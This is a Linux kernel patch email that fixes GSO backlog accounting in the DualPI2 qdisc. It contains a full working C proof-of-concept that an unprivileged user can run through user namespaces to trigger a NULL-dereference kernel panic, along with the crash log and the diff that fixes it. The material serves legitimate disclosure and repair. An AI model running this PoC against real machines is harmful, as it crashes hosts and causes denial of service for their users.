Received: from out-189.mta0.migadu.com (out-189.mta0.migadu.com [91.218.175.189])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 20151408638
	for <stable@vger.kernel.org>; Thu, 11 Jun 2026 18:05:03 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=91.218.175.189
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781201106; cv=none; b=D0AQn2NrhAXeFO7OIKe4B4KlF6KjFouIwNIN1szbzGLy0FFFwt7AYCcBszyBlDT2RD+wrRIjB3MFXANDst7hP88i15Xs0t+esSO6uSpksCooLJZGhAKfGbSzL/mL7azf6evSCQLLUc+O8aWt6cb8dfYN3x4hHibj5bod7hkKVfc=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781201106; c=relaxed/simple;
	bh=WL6Tk1DvxlPwfScetY/FnSppF4v2W4g8ASIkfgKeX84=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=eIjE+q94g+UX2YqyFSfPcwH7gpkwP0pHei8wJTcCyyj1j4Xj9q0jKK9Q8L6ky3IgzeGvZwfi5k0y3fcyVNMLP7KtGQxBAmNqvpc436XJwd23gVW4OWRxIIKg7hBK80WKmlV2gybSgcmpmDDFkgI7Z4KoA15s4xnmqFNeEZv9Pps=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=b1n.io; spf=pass smtp.mailfrom=b1n.io; dkim=pass (2048-bit key) header.d=b1n.io header.i=@b1n.io header.b=Q7PWuXUQ; arc=none smtp.client-ip=91.218.175.189
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=b1n.io
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=b1n.io
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=b1n.io header.i=@b1n.io header.b="Q7PWuXUQ"
X-Report-Abuse: Please report any abuse attempt to abuse@migadu.com and include these headers.
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=b1n.io; s=key1;
	t=1781201101;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:cc:mime-version:mime-version:
	 content-transfer-encoding:content-transfer-encoding;
	bh=BVEvCFB1AAAAY0YeEazI6nI4oauQSpADzqpJjSuPZpk=;
	b=Q7PWuXUQg99Jv19813zoPFYa5gygoe+ckkDIiAfMYQuRB9L361GdFtE3B9fMxt6NNSQZPg
	WZbr31XNtr1cclkgcUiSbJhh02NQ9fZJlhDr/RgSwc7UYOV8TlazyvwO8j0x44t361VjRc
	3FVj067o7mGzwge1nbrT+iQ9/8DRBsNdA9RHqTwL/BLsbCRKkAVZR6Q8x/wJqUzykQI8Pe
	TrSQ8+4WJiRw8ArAleqnz/E/irHmWzB5XDyszN2IdBip34bBXDKWgW9mAh07T7d/3Lnq45
	aysUCG3zE/VUGjsxGaOntW4vtyD8iVR7kTVKE96ev6z6qDRY6MRiZPEovOoP+Q==
From: Xingquan Liu <b1n@b1n.io>
To: b1narys@proton.me,
	b1nhack@proton.me
Cc: Xingquan Liu <b1n@b1n.io>,
	stable@vger.kernel.org
Subject: [PATCH] net/sched: dualpi2: fix GSO backlog accounting
Date: Thu, 11 Jun 2026 14:04:29 -0400
Message-ID: <20260611180456.159523-1-b1n@b1n.io>
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-Migadu-Flow: FLOW_OUT

When DualPI2 splits a GSO skb into N segments, it propagates N
additional packets to its parent before returning NET_XMIT_SUCCESS.
The parent then accounts for the original skb once more, leaving its
qlen one larger than the number of packets actually queued.

With QFQ as the parent, after all real packets are dequeued, QFQ still
has a non-zero qlen while its in-service aggregate has no active
classes. qfq_choose_next_agg() returns NULL and qfq_dequeue() passes
the result to qfq_peek_skb(), causing a NULL pointer dereference.

Count only successfully queued segments and propagate the difference
between the original skb and those segments. Return success whenever
at least one segment was queued.

Fixes: 8f9516daedd6 ("sched: Add enqueue/dequeue of dualpi2 qdisc")
Cc: stable@vger.kernel.org
Signed-off-by: Xingquan Liu <b1n@b1n.io>
---
The issue requires CONFIG_NET_SCH_QFQ and CONFIG_NET_SCH_DUALPI2, and
CAP_NET_ADMIN in the affected network namespace. When CONFIG_USER_NS
and CONFIG_NET_NS are enabled and unprivileged user namespace creation
is permitted, an unprivileged local user can obtain CAP_NET_ADMIN in a
new network namespace and trigger a host kernel DoS.

Tested on mainline 9716c086c8e8.

PoC:
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if_addr.h>
#include <linux/neighbour.h>
#include <linux/netlink.h>
#include <linux/pkt_sched.h>
#include <linux/rtnetlink.h>
#include <linux/udp.h>
#include <linux/veth.h>
#include <net/if.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef SOL_UDP
#define SOL_UDP 17
#endif

#define QFQ_HANDLE TC_H_MAKE(1U << 16, 0)
#define QFQ_CLASS TC_H_MAKE(1U << 16, 1)
#define DUALPI2_HANDLE TC_H_MAKE(2U << 16, 0)

#define PAYLOAD_LEN 4000
#define GSO_SIZE 1000

static const char *qdisc_device = "lo";
static const char *destination = "127.0.0.2";

struct nl_request {
	struct nlmsghdr n;
	union {
		struct ifinfomsg link;
		struct ifaddrmsg addr;
		struct ndmsg neigh;
		struct tcmsg tc;
	} u;
	char attrs[1024];
};

static uint32_t sequence;

static void fatal(const char *what)
{
	fprintf(stderr, "%s: %s\n", what, strerror(errno));
	exit(EXIT_FAILURE);
}

static void write_proc_file(const char *path, const char *value)
{
	size_t len = strlen(value);
	ssize_t written;
	int fd;

	fd = open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0)
		fatal(path);

	written = write(fd, value, len);
	if (written < 0 || (size_t)written != len) {
		int saved_errno = written < 0 ? errno : EIO;

		close(fd);
		errno = saved_errno;
		fatal(path);
	}
	close(fd);
}

static void enter_namespaces(void)
{
	char map[128];
	uid_t host_uid = getuid();
	gid_t host_gid = getgid();

	if (unshare(CLONE_NEWUSER) < 0)
		fatal("unshare(CLONE_NEWUSER)");

	write_proc_file("/proc/self/setgroups", "deny");

	snprintf(map, sizeof(map), "0 %u 1\n", host_uid);
	write_proc_file("/proc/self/uid_map", map);

	snprintf(map, sizeof(map), "0 %u 1\n", host_gid);
	write_proc_file("/proc/self/gid_map", map);

	if (setresgid(0, 0, 0) < 0)
		fatal("setresgid");
	if (setresuid(0, 0, 0) < 0)
		fatal("setresuid");

	if (unshare(CLONE_NEWNET) < 0)
		fatal("unshare(CLONE_NEWNET)");
}

static int addattr(struct nlmsghdr *n, size_t maxlen, unsigned short type,
		   const void *data, size_t len)
{
	size_t attr_len = RTA_LENGTH(len);
	size_t new_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(attr_len);
	struct rtattr *rta;

	if (new_len > maxlen) {
		errno = EMSGSIZE;
		return -1;
	}

	rta = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len = attr_len;
	if (len)
		memcpy(RTA_DATA(rta), data, len);
	n->nlmsg_len = new_len;
	return 0;
}

static struct rtattr *nest_start(struct nlmsghdr *n, size_t maxlen,
				 unsigned short type, const void *data,
				 size_t len)
{
	struct rtattr *nest;

	nest = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
	if (addattr(n, maxlen, type, data, len) < 0)
		return NULL;
	return nest;
}

static void nest_end(struct nlmsghdr *n, struct rtattr *nest)
{
	nest->rta_len = (char *)n + NLMSG_ALIGN(n->nlmsg_len) - (char *)nest;
}

static int rtnl_open(void)
{
	struct sockaddr_nl local = {
		.nl_family = AF_NETLINK,
	};
	int fd;

	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_ROUTE);
	if (fd < 0)
		fatal("socket(NETLINK_ROUTE)");
	if (bind(fd, (struct sockaddr *)&local, sizeof(local)) < 0)
		fatal("bind(NETLINK_ROUTE)");
	return fd;
}

static int rtnl_transact(int fd, struct nlmsghdr *request, const char *what)
{
	struct sockaddr_nl kernel = {
		.nl_family = AF_NETLINK,
	};
	struct iovec iov = {
		.iov_base = request,
		.iov_len = request->nlmsg_len,
	};
	struct msghdr msg = {
		.msg_name = &kernel,
		.msg_namelen = sizeof(kernel),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	char response[8192];

	request->nlmsg_seq = ++sequence;
	if (sendmsg(fd, &msg, 0) < 0)
		fatal(what);

	for (;;) {
		struct nlmsghdr *n;
		ssize_t ret;
		int remaining;

		ret = recv(fd, response, sizeof(response), 0);
		if (ret < 0) {
			if (errno == EINTR)
				continue;
			fatal("recv(NETLINK_ROUTE)");
		}

		remaining = ret;
		for (n = (struct nlmsghdr *)response; NLMSG_OK(n, remaining);
		     n = NLMSG_NEXT(n, remaining)) {
			const struct nlmsgerr *err;

			if (n->nlmsg_seq != request->nlmsg_seq ||
			    n->nlmsg_type != NLMSG_ERROR)
				continue;

			err = NLMSG_DATA(n);
			if (!err->error)
				return 0;

			errno = -err->error;
			return -1;
		}
	}
}

static void init_link_request(struct nl_request *req, int type)
{
	memset(req, 0, sizeof(*req));
	req->n.nlmsg_len = NLMSG_LENGTH(sizeof(req->u.link));
	req->n.nlmsg_type = type;
	req->n.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	req->u.link.ifi_family = AF_UNSPEC;
	req->u.link.ifi_change = 0xffffffffU;
}

static int set_link_up(int fd, const char *name)
{
	struct nl_request req;

	init_link_request(&req, RTM_NEWLINK);
	req.u.link.ifi_index = if_nametoindex(name);
	if (!req.u.link.ifi_index) {
		errno = ENODEV;
		return -1;
	}
	req.u.link.ifi_flags = IFF_UP;
	req.u.link.ifi_change = IFF_UP;
	return rtnl_transact(fd, &req.n, "set link up");
}

static void init_tc_request(struct nl_request *req, int type, int ifindex,
			    uint32_t parent, uint32_t handle)
{
	memset(req, 0, sizeof(*req));
	req->n.nlmsg_len = NLMSG_LENGTH(sizeof(req->u.tc));
	req->n.nlmsg_type = type;
	req->n.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE |
			     NLM_F_EXCL;
	req->u.tc.tcm_family = AF_UNSPEC;
	req->u.tc.tcm_ifindex = ifindex;
	req->u.tc.tcm_parent = parent;
	req->u.tc.tcm_handle = handle;
}

static int create_qdisc(int fd, int ifindex, uint32_t parent, uint32_t handle,
			const char *kind)
{
	struct nl_request req;
	char description[128];

	init_tc_request(&req, RTM_NEWQDISC, ifindex, parent, handle);
	if (addattr(&req.n, sizeof(req), TCA_KIND, kind, strlen(kind) + 1) < 0)
		return -1;

	snprintf(description, sizeof(description), "create %s qdisc", kind);
	return rtnl_transact(fd, &req.n, description);
}

static int create_qfq_class(int fd, int ifindex)
{
	const uint32_t weight = 1;
	const uint32_t lmax = 65536;
	struct rtattr *options;
	struct nl_request req;

	init_tc_request(&req, RTM_NEWTCLASS, ifindex, QFQ_HANDLE, QFQ_CLASS);
	if (addattr(&req.n, sizeof(req), TCA_KIND, "qfq", sizeof("qfq")) < 0)
		return -1;

	options = nest_start(&req.n, sizeof(req), TCA_OPTIONS, NULL, 0);
	if (!options)
		return -1;
	if (addattr(&req.n, sizeof(req), TCA_QFQ_WEIGHT, &weight,
		    sizeof(weight)) < 0 ||
	    addattr(&req.n, sizeof(req), TCA_QFQ_LMAX, &lmax, sizeof(lmax)) < 0)
		return -1;
	nest_end(&req.n, options);

	return rtnl_transact(fd, &req.n, "create QFQ class 1:1");
}

static void configure_network(void)
{
	unsigned int ifindex;
	int fd;

	fd = rtnl_open();

	if (set_link_up(fd, "lo") < 0)
		exit(EXIT_FAILURE);

	ifindex = if_nametoindex(qdisc_device);
	if (!ifindex)
		fatal("if_nametoindex(qdisc device)");

	if (create_qdisc(fd, ifindex, TC_H_ROOT, QFQ_HANDLE, "qfq") < 0 ||
	    create_qfq_class(fd, ifindex) < 0 ||
	    create_qdisc(fd, ifindex, QFQ_CLASS, DUALPI2_HANDLE, "dualpi2") < 0)
		exit(EXIT_FAILURE);

	close(fd);
	printf("configured %s: QFQ 1: -> class 1:1 -> DualPI2 2:\n",
	       qdisc_device);
}

static void trigger_udp_gso(void)
{
	char control[CMSG_SPACE(sizeof(uint16_t))] = {};
	char payload[PAYLOAD_LEN];
	struct sockaddr_in dst = {
		.sin_family = AF_INET,
		.sin_port = htons(9000),
	};
	struct iovec iov = {
		.iov_base = payload,
		.iov_len = sizeof(payload),
	};
	struct msghdr msg = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = control,
		.msg_controllen = sizeof(control),
	};
	uint16_t gso_size = GSO_SIZE;
	int priority = QFQ_CLASS;
	struct cmsghdr *cmsg;
	ssize_t ret;
	int fd;

	memset(payload, 0x41, sizeof(payload));
	if (inet_pton(AF_INET, destination, &dst.sin_addr) != 1) {
		errno = EINVAL;
		fatal("inet_pton(destination)");
	}

	fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
	if (fd < 0)
		fatal("socket(AF_INET, SOCK_DGRAM)");

	if (setsockopt(fd, SOL_SOCKET, SO_PRIORITY, &priority,
		       sizeof(priority)) < 0)
		fatal("setsockopt(SO_PRIORITY)");
	if (connect(fd, (struct sockaddr *)&dst, sizeof(dst)) < 0)
		fatal("connect(UDP)");

	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_UDP;
	cmsg->cmsg_type = UDP_SEGMENT;
	cmsg->cmsg_len = CMSG_LEN(sizeof(gso_size));
	memcpy(CMSG_DATA(cmsg), &gso_size, sizeof(gso_size));

	printf("sending one %u-byte UDP GSO skb (%u x %u-byte segments)\n",
	       PAYLOAD_LEN, PAYLOAD_LEN / GSO_SIZE, GSO_SIZE);
	fflush(stdout);

	ret = sendmsg(fd, &msg, 0);
	if (ret < 0)
		fatal("sendmsg(UDP_SEGMENT)");

	printf("sendmsg returned %zd; no immediate kernel crash observed\n",
	       ret);
	close(fd);
}

int main(void)
{
	enter_namespaces();
	configure_network();
	trigger_udp_gso();
	return EXIT_SUCCESS;
}

oops:
sending one 4000-byte UDP GSO skb (4 x 1000-byte segments)
[   30.100212] BUG: kernel NULL pointer dereference, address: 0000000000000048
[   30.100422] #PF: supervisor read access in kernel mode
[   30.100482] #PF: error_code(0x0000) - not-present page
[   30.100567] PGD 4366067 P4D 4366067 PUD 66ec067 PMD 0
[   30.100761] Oops: Oops: 0000 [#1] SMP NOPTI
[   30.101044] CPU: 0 UID: 1000 PID: 296 Comm: poc Not tainted 7.1.0-rc6-00249-g7360b9609980 #6 PREEMPT(lazy)
[   30.101159] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-10.fc44 06/10/2025
[   30.101331] RIP: 0010:qfq_dequeue+0xe5/0x300
[   30.101620] Code: ff 4c 89 f6 e8 7c 1f 00 00 eb 0d 83 bb d0 00 00 00 00 0f 84 ca 01 00 00 4c 89 ff e8 c5 19 00 00 49 89 c6 48 89 83 b8 01 00 00 <4c> 8b 60 48 49 8b 7c 24 f8 48 8b 47 18 4c 8b 58 38 2e e8 e4 9d 34
[   30.101825] RSP: 0018:ffffc9000047f760 EFLAGS: 00010246
[   30.101901] RAX: 0000000000000000 RBX: ffff88800be12000 RCX: 0000000000000000
[   30.101972] RDX: 0000000000000000 RSI: 0000000000000000 RDI: ffff88800be12180
[   30.102040] RBP: ffffc9000047f798 R08: 0000041200000000 R09: 0000000000000000
[   30.102110] R10: ffff8880066d67a8 R11: ffffffff82073d00 R12: ffff8880067d8048
[   30.102180] R13: ffff8880067d8048 R14: 0000000000000000 R15: ffff88800be12180
[   30.102277] FS:  000000000040c7b8(0000) GS:ffff8880faa38000(0000) knlGS:0000000000000000
[   30.102384] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   30.102448] CR2: 0000000000000048 CR3: 0000000006447000 CR4: 00000000003006f0
[   30.102570] Call Trace:
[   30.102808]  <TASK>
[   30.102945]  __qdisc_run+0x8d/0x5f0
[   30.103071]  ? __dev_queue_xmit+0x76/0xf10
[   30.103119]  __dev_queue_xmit+0xad4/0xf10
[   30.103164]  ? arp_constructor+0x182/0x230
[   30.103225]  ? __dev_queue_xmit+0x76/0xf10
[   30.103277]  ? ___neigh_create+0x75a/0x810
[   30.103328]  neigh_resolve_output+0x159/0x1a0
[   30.103378]  ip_finish_output2+0x2aa/0x370
[   30.103427]  ip_finish_output+0x15c/0x260
[   30.103472]  ip_output+0x61/0x100
[   30.103512]  ? __pfx_ip_finish_output+0x10/0x10
[   30.103564]  ip_send_skb+0x88/0xa0
[   30.103600]  udp_send_skb+0x1fb/0x2b0
[   30.103642]  udp_sendmsg+0x979/0xa50
[   30.103711]  inet_sendmsg+0x63/0x70
[   30.103752]  __sock_sendmsg+0x67/0x90
[   30.103796]  ____sys_sendmsg+0x1a1/0x200
[   30.103845]  ___sys_sendmsg+0x289/0x2d0
[   30.103912]  __x64_sys_sendmsg+0xe7/0x140
[   30.103964]  x64_sys_call+0x195f/0x3030
[   30.104008]  do_syscall_64+0x136/0x3a0
[   30.104055]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   30.104139] RIP: 0033:0x405dc0
[   30.104292] Code: 0f 1f 84 00 00 00 00 00 66 90 f3 0f 1e fa 55 48 89 f8 4d 89 c2 48 89 f7 4d 89 c8 48 89 d6 48 89 ca 48 89 e5 4c 8b 4d 10 0f 05 <5d> c3 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 40 00 f3 0f 1e fa e9 c7
[   30.104460] RSP: 002b:00007ffd1618ae00 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[   30.104540] RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 0000000000405dc0
[   30.104613] RDX: 0000000000000000 RSI: 00007ffd1618ae30 RDI: 0000000000000003
[   30.104680] RBP: 00007ffd1618ae00 R08: 0000000000000000 R09: 0000000000000000
[   30.104762] R10: 0000000000000000 R11: 0000000000000246 R12: 00007ffd1618c3d8
[   30.104831] R13: 0000000000400280 R14: 00007ffd1618c3e8 R15: 0000000000000000
[   30.104922]  </TASK>
[   30.104988] Modules linked in:
[   30.105127] CR2: 0000000000000048
[   30.105368] ---[ end trace 0000000000000000 ]---
[   30.105515] RIP: 0010:qfq_dequeue+0xe5/0x300
[   30.105565] Code: ff 4c 89 f6 e8 7c 1f 00 00 eb 0d 83 bb d0 00 00 00 00 0f 84 ca 01 00 00 4c 89 ff e8 c5 19 00 00 49 89 c6 48 89 83 b8 01 00 00 <4c> 8b 60 48 49 8b 7c 24 f8 48 8b 47 18 4c 8b 58 38 2e e8 e4 9d 34
[   30.105742] RSP: 0018:ffffc9000047f760 EFLAGS: 00010246
[   30.105800] RAX: 0000000000000000 RBX: ffff88800be12000 RCX: 0000000000000000
[   30.105876] RDX: 0000000000000000 RSI: 0000000000000000 RDI: ffff88800be12180
[   30.105945] RBP: ffffc9000047f798 R08: 0000041200000000 R09: 0000000000000000
[   30.106009] R10: ffff8880066d67a8 R11: ffffffff82073d00 R12: ffff8880067d8048
[   30.106070] R13: ffff8880067d8048 R14: 0000000000000000 R15: ffff88800be12180
[   30.106138] FS:  000000000040c7b8(0000) GS:ffff8880faa38000(0000) knlGS:0000000000000000
[   30.106216] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   30.106272] CR2: 0000000000000048 CR3: 0000000006447000 CR4: 00000000003006f0
[   30.106417] Kernel panic - not syncing: Fatal exception in interrupt
[   30.106952] Kernel Offset: disabled
[   30.107075] ---[ end Kernel panic - not syncing: Fatal exception in interrupt ]---

 net/sched/sch_dualpi2.c | 11 +++++------
 1 file changed, 5 insertions(+), 6 deletions(-)

diff --git a/net/sched/sch_dualpi2.c b/net/sched/sch_dualpi2.c
index a22489c14458..1ca4d2c03e61 100644
--- a/net/sched/sch_dualpi2.c
+++ b/net/sched/sch_dualpi2.c
@@ -461,7 +461,7 @@ static int dualpi2_qdisc_enqueue(struct sk_buff *skb, struct Qdisc *sch,
 		if (IS_ERR_OR_NULL(nskb))
 			return qdisc_drop(skb, sch, to_free);

-		cnt = 1;
+		cnt = 0;
 		byte_len = 0;
 		orig_len = qdisc_pkt_len(skb);
 		skb_list_walk_safe(nskb, nskb, next) {
@@ -488,16 +488,15 @@ static int dualpi2_qdisc_enqueue(struct sk_buff *skb, struct Qdisc *sch,
 				byte_len += nskb->len;
 			}
 		}
-		if (cnt > 1) {
+		if (cnt > 0) {
 			/* The caller will add the original skb stats to its
 			 * backlog, compensate this if any nskb is enqueued.
 			 */
-			--cnt;
-			byte_len -= orig_len;
+			qdisc_tree_reduce_backlog(sch, 1 - cnt,
+						  orig_len - byte_len);
 		}
-		qdisc_tree_reduce_backlog(sch, -cnt, -byte_len);
 		consume_skb(skb);
-		return err;
+		return cnt > 0 ? NET_XMIT_SUCCESS : err;
 	}
 	return dualpi2_enqueue_skb(skb, sch, to_free);
 }

base-commit: 7360b96099806396f4ce15233f6dddcb69248d34
--
Xingquan Liu

